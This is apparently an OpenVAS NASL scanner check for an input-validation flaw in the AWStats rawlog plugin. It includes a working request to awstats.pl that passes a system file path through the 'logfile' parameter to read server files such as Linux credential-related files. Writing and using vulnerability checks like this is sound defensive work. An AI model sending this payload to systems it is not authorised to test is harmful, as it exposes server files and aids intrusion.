###################################################################
# OpenVAS Vulnerability Test
# $Id: awstats_input_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# AWStats rawlog plugin logfile parameter input validation vulnerability
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Netwok Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###################################################################

# Ref: Johnathan Bat <spam@blazemail.com>

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14347");
  script_version("$Revision: 7577 $");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(10950);
  script_name("AWStats rawlog plugin logfile parameter input validation vulnerability");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade to the latest version of this software");
  script_tag(name:"summary", value:"The remote host seems to be running AWStats, a free real-time logfile analyzer.

  AWStats Rawlog Plugin is reported prone to an input validation vulnerability.");
  script_tag(name:"impact", value:"An attacker may exploit this condition to execute commands remotely or disclose
  contents of web server readable files.");
  script_tag(name:"insight", value:"The issue is reported to exist because user supplied 'logfile' URI data passed
  to the 'awstats.pl' script is not sanitized.");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

files = traversal_files("linux");

foreach dir( make_list_unique( "/", "/awstats", "/stats", "/stat", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file( keys( files ) ) {

    url = dir + "/awstats.pl?filterrawlog=&rawlog_maxlines=5000&config=" + get_host_name() + "&framename=main&pluginmode=rawlog&logfile=/" + files[file];

    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
